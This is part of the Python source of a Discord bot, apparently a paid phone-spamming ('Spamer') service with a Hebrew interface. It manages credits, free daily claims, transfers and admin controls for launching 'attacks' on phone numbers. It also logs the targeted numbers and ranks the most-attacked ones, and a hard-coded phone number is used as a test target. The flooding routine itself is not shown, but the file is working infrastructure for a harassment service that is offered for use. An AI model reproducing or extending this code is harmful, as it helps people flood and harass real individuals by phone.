            embed.add_field(name="📊 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
            embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
            embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        stats = await get_global_stats()
        
        if not stats:
            embed = discord.Embed(title="📊 סטטיסטיקה", description="אין נתונים", color=COLOR_INFO)
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
        embed.add_field(name="🎯 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
        embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all")
    async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_admin(interaction):
            await interaction.response.send_message("❌ רק אדמינים יכולים לעצור את כל המתקפות", ephemeral=True)
            return
        
        stopped_count = 0
        for user_id, event in list(active_missions.items()):
            if event and not event.is_set():
                event.set()
                stopped_count += 1
        
        active_missions.clear()
        
        embed = discord.Embed(
            title="🛑 כל המתקפות הופסקו",
            description=f"הופסקו {stopped_count} מתקפות פעילות",
            color=COLOR_SUCCESS
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

class FreeCoins(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל קרדיט חינם", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        
        await interaction.response.defer(ephemeral=True)

        doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
        if doc:
            diff = now - doc.get("last_claim", 0)
            if diff < 86400:
                hours = int((86400 - diff) // 3600)
                minutes = int(((86400 - diff) % 3600) // 60)
                embed = discord.Embed(
                    title="⏱️ קרדיטים חינם",
                    description=f"תוכל לקבל קרדיט נוסף בעוד {hours} שעות ו-{minutes} דקות",
                    color=COLOR_WARNING
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

        await add_credits(uid, 1)
        await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)

        new_bal = await format_balance(uid)
        
        embed = discord.Embed(
            title="🎁 קיבלת קרדיט",
            description=f"+1 קרדיט\n\nיתרה: {new_bal}",
            color=0xFFD700
        )
        
        await interaction.followup.send(embed=embed, ephemeral=True)

async def get_user_stats(user_id: int):
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": "$user_id",
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_stats():
    pipeline = [
        {"$group": {
            "_id": None,
            "total_attacks": {"$sum": 1},
            "total_cost": {"$sum": "$cost"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "unique_users": {"$addToSet": "$user_id"}
        }}
    ]
    result = await logs_collection.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_user_logs(user_id: int, limit: int = 20):
    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_logs(limit: int = 100):
    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_top_targets(limit: int = 10):
    pipeline = [
        {"$group": {
            "_id": "$phone",
            "count": {"$sum": 1},
            "success_total": {"$sum": "$success_count"}
        }},
        {"$sort": {"count": -1}},
        {"$limit": limit}
    ]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

@client.event
async def on_ready():
    await tree.sync()
    print(f"✅ CyberIL Spamer פעיל → {client.user}")
    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")

    await asyncio.sleep(2)

    try:
        main_ch = client.get_channel(PANEL_CHANNEL)
        if main_ch:
            await main_ch.purge(limit=5)
            await main_ch.send(embed=create_panel(), view=MainPanel())
            print(f"✅ פאנל נשלח ל-{main_ch.name}")

        gift_ch = client.get_channel(GIFT_CHANNEL)
        if gift_ch:
            await gift_ch.purge(limit=5)
            await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")

    except Exception as e:
        print(f"❌ שגיאה: {e}")

@tree.command(name="credit", description="בדוק יתרת קרדיטים")
async def cmd_credit(interaction: discord.Interaction):
    await cmd_credits(interaction)

@tree.command(name="credits", description="בדוק יתרת קרדיטים")
@app_commands.describe(member="משתמש לבדיקה")
async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal = await format_balance(target.id)
    stats = await get_user_stats(target.id)

    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
    if stats:
        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
        embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

    await interaction.response.send_message(embed=embed)

@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, True)
    embed = discord.Embed(title="♾️ ללא הגבלה הוענק", description=f"{member.mention} קיבל ללא הגבלה", color=COLOR_SUCCESS)
    await interaction.followup.send(embed=embed)

@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, False)
    embed = discord.Embed(title="♾️ ללא הגבלה הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
    await interaction.followup.send(embed=embed)

@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים")
async def cmd_freecredits(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())

@tree.command(name="giveall", description="[ADMIN] תן לכולם")
@app_commands.describe(amount="כמות")
async def cmd_giveall(interaction: discord.Interaction, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await users_collection.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)

@tree.command(name="transfer", description="העבר קרדיטים")
@app_commands.describe(member="מקבל", amount="כמות")
async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה 20", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
        return

    uid = interaction.user.id
    if await has_unlimited(uid):
        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר", ephemeral=True)
        return

    bal = await fetch_balance(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים", ephemeral=True)
        return

    await remove_credits(uid, amount)
    await add_credits(member.id, amount)

    embed = discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS)
    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
    embed.add_field(name="אל", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"{amount}", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="mylogs", description="הצג לוגים")
async def cmd_mylogs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_logs(interaction.user.id, 10)

    if not logs:
        await interaction.followup.send("📭 אין מתקפות", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים", color=COLOR_INFO)
    for log in logs:
        embed.add_field(
            name=f"{log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
async def cmd_checkstatus(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    test_num = "0506500708"
    success, failed = await run_all(test_num)

    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
    embed.add_field(name="✅ הצלחות", value=str(success), inline=True)
    embed.add_field(name="❌ כשלונות", value=str(failed), inline=True)
    embed.add_field(name="🔢 סה\"כ", value=str(success + failed), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="attacklogs", description="[ADMIN] לוגים")
@app_commands.describe(limit="כמות")
async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    logs = await get_all_logs(min(limit, 50))

    if not logs:
        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(
            name=f"{log['username']} | {log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
async def cmd_topnumbers(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    top = await get_top_targets(10)

    if not top:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="🎯 מספרים מובילים", color=COLOR_INFO)
    for i, item in enumerate(top, 1):
        embed.add_field(
            name=f"{i}. {item['_id']}",
            value=f"מתקפות: {item['count']} | הצלחות: {item['success_total']}",
            inline=False
        )

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
async def cmd_globalstats(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()

    if not stats:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
    embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)

    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="stopall", description="[ADMIN] עצור את כל המתקפות")
async def cmd_stopall(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    
    stopped_count = 0
    for user_id, event in list(active_missions.items()):
        if event and not event.is_set():
            event.set()
            stopped_count += 1
    
    active_missions.clear()
    
    embed = discord.Embed(
        title="🛑 כל המתקפות הופסקו",
        description=f"הופסקו {stopped_count} מתקפות פעילות",
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command(name="restart", description="[ADMIN] אתחל בוט")
async def cmd_restart(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
    await client.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

if __name__ == "__main__":
    client.run(TOKEN)
